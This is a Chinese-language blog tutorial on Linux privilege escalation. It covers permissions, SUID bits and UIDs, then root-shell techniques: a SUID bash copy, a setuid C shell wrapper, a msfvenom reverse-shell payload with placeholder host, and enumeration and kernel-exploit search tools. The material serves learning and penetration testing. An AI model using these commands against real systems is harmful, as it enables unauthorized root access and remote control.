<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="Linux提权">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux提权">
<meta property="og:url" content="http://example.com/2021/07/09/Linux%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Linux提权">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701131222816.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701132736765.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701132748704.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630111311891.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630112011959.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630112353863.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630112537357.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630120211277.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630113819038.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630120237500.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630120353418.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630114911170.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630115710381.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630130745288.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630133158537.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630134221883.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630140751442.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630140948488.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141431879.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141447898.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141653620.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630142720204.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630144055411.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630144137065.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630144159777.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630145719525.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630145846124.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630145957018.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150036456.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150207862.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150549882.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150624343.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151315783.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151343205.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151358879.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151410318.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151814494.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151929543.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630152045099.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630152738111.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704102546394.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630162439011.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630162439011.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630163336520.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630163503549.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141447898.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630164008714.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704102838002.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103218382.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103256577.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103440965.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103702129.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103723147.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171256823.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171347594.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171515478.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171650623.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630173619529.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630173757396.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630174309759.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704104709412.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704104806120.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110051360.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110127651.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110119309.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110200778.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110307745.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630180510655.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630180804891.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630181009415.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630181114318.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110724989.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110700833.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701115900118.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704111607655.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704112350458.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704112538615.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704112616418.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701171659145.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173258438.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172526881.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172644492.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172832305.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172915956.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173043064.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173211516.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173504658.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173542883.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173609992.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173845361.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173901466.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180324981.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180528720.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180706925.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180741245.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180850281.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701180920818.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181023210.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181321426.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181516464.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181613497.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701183617720.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701183702574.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701183905563.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701184010960.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701184121840.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701184058216.png">
<meta property="article:published_time" content="2021-07-09T04:01:12.112Z">
<meta property="article:modified_time" content="2021-07-09T04:08:26.354Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Linux提权">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701131222816.png"><title>Linux提权 | Hexo</title><link ref="canonical" href="http://example.com/2021/07/09/Linux%E6%8F%90%E6%9D%83/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Linux提权</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-07-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-07-09</span></span></div></header><div class="post-body"><p><strong>Linux提权</strong></p>
<span id="more"></span>


        <h1 id="0x01-一般概念"   >
          <a href="#0x01-一般概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x01-一般概念" class="headerlink" title="0x01 一般概念"></a>0x01 一般概念</h1>
      <p>我们在 Linux 中特权升级的最终目标是获得root用户</p>

        <h2 id="用户、组、文件、目录"   >
          <a href="#用户、组、文件、目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#用户、组、文件、目录" class="headerlink" title="用户、组、文件、目录"></a>用户、组、文件、目录</h2>
      
        <h3 id="四者之间的关系"   >
          <a href="#四者之间的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#四者之间的关系" class="headerlink" title="四者之间的关系"></a>四者之间的关系</h3>
      <p>用户可以属于多个组。组可以具有多个用户。</p>
<p>每个文件和目录都根据用户、组和”其他用户”（所有其他用户）来定义其权限。</p>

        <h3 id="用户"   >
          <a href="#用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#用户" class="headerlink" title="用户"></a>用户</h3>
      <p>用户帐户配置在/etc/passwd文件。</p>
<p>用户密码哈希存储在/etc/shadow文件中。</p>
<p>用户由整数用户 ID (UID)识别。</p>
<p>root用户帐户是 Linux 中的一种特殊类型的帐户。它的 <strong>UID 为 0</strong>，系统允许此用户访问每个文件。</p>

        <h3 id="组"   >
          <a href="#组" class="heading-link"><i class="fas fa-link"></i></a><a href="#组" class="headerlink" title="组"></a>组</h3>
      <p>组配置在/etc/group文件中。</p>
<p>用户有一个主要组，并且可以有multiple二级（或补充）组。</p>
<p>默认情况下，用户的主要组与用户帐户的名称相同。</p>

        <h3 id="文件和目录"   >
          <a href="#文件和目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3>
      <p>所有文件和目录都有一个所有者和一个组。</p>
<p>权限以读取、编写和执行操作的方式定义。</p>
<p>有三组权限，一组为所有者，一组为组，一组为所有”其他”用户</p>
<p><strong>只有所有者才能更改权限</strong></p>

        <h2 id="权限"   >
          <a href="#权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#权限" class="headerlink" title="权限"></a>权限</h2>
      
        <h3 id="文件权限"   >
          <a href="#文件权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3>
      <p>•  Read -设置后，可以读取文件内容。</p>
<p>•  Write -设置后，文件 内容可以修改。</p>
<p>•  Execute -设置后，文件可以执行 （即作为某种过程运行 ）。</p>

        <h3 id="目录权限"   >
          <a href="#目录权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3>
      <p>•  Execute 设置时，目录可以输入。未经此许可，读取或写入权限均不起作用。</p>
<p>•  Read -设置时，目录内容可以列出。</p>
<p>•  Write -设置时，文件和子目录可以在目录中创建。</p>

        <h3 id="特殊权限"   >
          <a href="#特殊权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3>
      <p>•  setuid (SUID) bit</p>
<p>设置后，文件将使用文件所有者的权限执行。</p>
<p>•  setgid (SGID) bit</p>
<p>设置在文件上时，文件将使用文件组的权限执行。</p>
<p>设置在目录上时，该目录内创建的文件将继承目录本身的组。</p>

        <h3 id="查看权限"   >
          <a href="#查看权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3>
      <p>ls命令可以查看权限</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/date</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701131222816.png" alt="image-20210701131222816"></p>
<p>简单阐述一下： 前10个字符表示对文件设置的权限或目录。 </p>
<p> 第一个字符只是表示类型，例如，文件<code>d</code>的<code>-</code>用于目录</p>
<p>剩下的9个字符代表3组权限(所有者、组、其他)</p>
<p>每组包含3个字符，表示读(r)、写(r)，可执行(x)</p>
<p>SUID/SGID权限由中的<code>s</code>表示执行位置</p>

        <h2 id="真实、有效和保存的UID-GID"   >
          <a href="#真实、有效和保存的UID-GID" class="heading-link"><i class="fas fa-link"></i></a><a href="#真实、有效和保存的UID-GID" class="headerlink" title="真实、有效和保存的UID/GID"></a>真实、有效和保存的UID/GID</h2>
      
        <h3 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h3>
      <p>用户是由用户ID标识的。</p>
<p>实际上，在Linux中，每个用户有3个用户id(real，effective，and saved)</p>
<p>用户的真实ID是他们的真实身份<code>/etc/passwd</code>中定义的ID</p>

        <h3 id="继续深入"   >
          <a href="#继续深入" class="heading-link"><i class="fas fa-link"></i></a><a href="#继续深入" class="headerlink" title="继续深入"></a>继续深入</h3>
      <p>用户的有效ID通常等于其真实ID，但是作为另一个用户执行一个进程时，有效ID被设置为该用户的真实身份。</p>
<p>在大多数访问控制决策中，有效ID用于验证用户，</p>
<p><code>whoami</code>等命令使用有效ID。</p>
<p>最后，保存的ID用于确保<code>SUID</code>进程</p>
<p>临时将用户的有效ID切换回其真实ID并返回，在不丢失原始有效ID的情况下</p>

        <h3 id="实操"   >
          <a href="#实操" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="真实有效的用户-组ID："   >
          <a href="#真实有效的用户-组ID：" class="heading-link"><i class="fas fa-link"></i></a><a href="#真实有效的用户-组ID：" class="headerlink" title="真实有效的用户/组ID："></a>真实有效的用户/组ID：</h4>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701132736765.png" alt="image-20210701132736765"></p>

        <h4 id="当前进程（即我们的shell）"   >
          <a href="#当前进程（即我们的shell）" class="heading-link"><i class="fas fa-link"></i></a><a href="#当前进程（即我们的shell）" class="headerlink" title="当前进程（即我们的shell）"></a>当前进程（即我们的shell）</h4>
      <p>真实、有效、已保存和文件系统用户/组ID</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/$$/status | grep &quot;[UG]id&quot;</span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701132748704.png" alt="image-20210701132748704"></p>

        <h1 id="0x02-生成外壳"   >
          <a href="#0x02-生成外壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x02-生成外壳" class="headerlink" title="0x02 生成外壳"></a>0x02 生成外壳</h1>
      
        <h2 id="前言-1"   >
          <a href="#前言-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2>
      <p>目标：生成root外壳执行<code>/bin/sh</code> 或<code> /bin/bash</code></p>

        <h2 id="rootbash-SUID"   >
          <a href="#rootbash-SUID" class="heading-link"><i class="fas fa-link"></i></a><a href="#rootbash-SUID" class="headerlink" title="rootbash SUID"></a>rootbash SUID</h2>
      <p>创建一个副本 </p>
<p>在/bin/bash可执行文件中创建一个副本 ，通常将其重命名为rootbash，确保它归根用户所有</p>
<p>并且设置了SUID位，只需执行rootbash文件就可以生成root的shell </p>
<p>使用<code>-p</code>命令行选项，可以持久，方便我们多次利用rootbash</p>

        <h2 id="自定义可执行文件"   >
          <a href="#自定义可执行文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#自定义可执行文件" class="headerlink" title="自定义可执行文件"></a>自定义可执行文件</h2>
      <p> 可能存在某些根进程执行另一个root进程，你可以控制的过程。</p>
<p>这时候</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>上一串神秘的<code>.c</code>代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o &lt;name&gt; &lt;filename.c</span><br></pre></td></tr></table></div></figure>

<p>编译后，将生成一个以root身份运行的Bash shell： </p>

        <h2 id="msfvenom"   >
          <a href="#msfvenom" class="heading-link"><i class="fas fa-link"></i></a><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2>
      <p>反向外壳 首先msfvenom，又叫毒液</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; a001.elf</span><br></pre></td></tr></table></div></figure>

<p>接收shell的话 可以使用：nc或者msf中的监听(multi/handler)</p>

        <h2 id="本地反向外壳"   >
          <a href="#本地反向外壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地反向外壳" class="headerlink" title="本地反向外壳"></a>本地反向外壳</h2>
      <p>使用一个工具是</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/mthbernardes/rsg" >https://github.com/mthbernardes/rsg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>接收shell的话 可以使用：nc</p>

        <h1 id="0x03-工具"   >
          <a href="#0x03-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h1>
      
        <h2 id="Linux-Smart-Enumeration"   >
          <a href="#Linux-Smart-Enumeration" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux-Smart-Enumeration" class="headerlink" title="Linux Smart Enumeration"></a>Linux Smart Enumeration</h2>
      <p>优点：靶机环境没有安装Python</p>
<p><code>lse.sh</code>是一个 Bash 脚本，它有多个级别， 一步一步的扩展信息</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration" >https://github.com/diego-treitos/linux-smart-enumeration</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="LinEnum"   >
          <a href="#LinEnum" class="heading-link"><i class="fas fa-link"></i></a><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h2>
      <p>LinEnum 是一个高级 Bash 脚本，它从目标系统中提取了大量有用的信息。<br>它可以复制文件并进行导出，同时可以搜索包含关键字的文件。<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum" >https://github.com/rebootuser/LinEnum</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="其他工具"   >
          <a href="#其他工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/linted/linuxprivchecker" >https://github.com/linted/linuxprivchecker</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot" >https://github.com/AlessandroZ/BeRoot</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check" >http://pentestmonkey.net/tools/audit/unix-privesc-check</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="0x04-内核漏洞"   >
          <a href="#0x04-内核漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x04-内核漏洞" class="headerlink" title="0x04 内核漏洞"></a>0x04 内核漏洞</h1>
      
        <h2 id="前言-2"   >
          <a href="#前言-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2>
      <p>内核是任何操作系统的核心。<br>将其视为应用程序软件和实际计算机硬件之间的一层</p>
<p>但是这边注意：<strong>没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机</strong></p>

        <h2 id="查找内核漏洞"   >
          <a href="#查找内核漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找内核漏洞" class="headerlink" title="查找内核漏洞"></a>查找内核漏洞</h2>
      <ul>
<li><p>1.查看内核版本(uname-a)</p>
</li>
<li><p>2.查找与之相匹配的漏洞（Google, ExploitDB, GitHub）。</p>
</li>
<li><p>3.编译并运行。</p>
</li>
</ul>

        <h2 id="实操-1"   >
          <a href="#实操-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2>
      
        <h3 id="查看内核版本"   >
          <a href="#查看内核版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看内核版本" class="headerlink" title="查看内核版本"></a>查看内核版本</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630111311891.png" alt="image-20210630111311891"></p>

        <h3 id="漏洞寻找"   >
          <a href="#漏洞寻找" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux debian 2.6.32</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630112011959.png" alt="image-20210630112011959"></p>

        <h3 id="安装漏洞建议器"   >
          <a href="#安装漏洞建议器" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装漏洞建议器" class="headerlink" title="安装漏洞建议器"></a>安装漏洞建议器</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2" >https://github.com/jondonas/linux-exploit-suggester-2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>查看参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[-h]帮助</span><br><span class="line"></span><br><span class="line">[-k]内核号</span><br><span class="line"></span><br><span class="line">[-d]打开漏洞利用下载菜单 </span><br></pre></td></tr></table></div></figure>



